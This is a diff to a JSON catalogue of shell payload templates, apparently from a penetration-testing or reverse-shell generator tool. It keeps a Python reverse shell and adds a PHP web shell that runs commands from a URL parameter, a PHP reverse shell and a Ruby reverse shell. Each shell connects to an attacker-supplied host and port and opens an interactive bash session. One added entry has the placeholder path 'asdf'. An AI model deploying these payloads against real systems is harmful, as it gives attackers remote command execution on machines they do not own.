@@ -23,6 +23,32 @@
           "template": "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{{LHOST}}\",{{LPORT}}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
         }
       ]
+    },
+    {
+      "name": "PHP",
+      "payloads": [
+        {
+          "name": "One-liner Web Shell",
+          "template": "<?php system($_GET['cmd']); ?>"
+        },
+        {
+          "name": "One-linerReverse Shell",
+          "template": "php -r \"$sock=fsockopen(\"{{LHOST}}\",{{LPORT}});exec(\"/bin/bash -i <&3 >&3 2>&3\");\""
+        },
+        {
+          "name": "Reverse Shell (File)",
+          "path": "asdf"
+        }
+      ]
+    },
+    {
+      "name": "Ruby",
+      "payloads": [
+        {
+          "name": "Reverse Shell",
+          "template": "ruby -rsocket -e'f=TCPSocket.open(\"{{LHOST}}\",{{LPORT}}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'"
+        }
+      ]
     }
   ]
 }
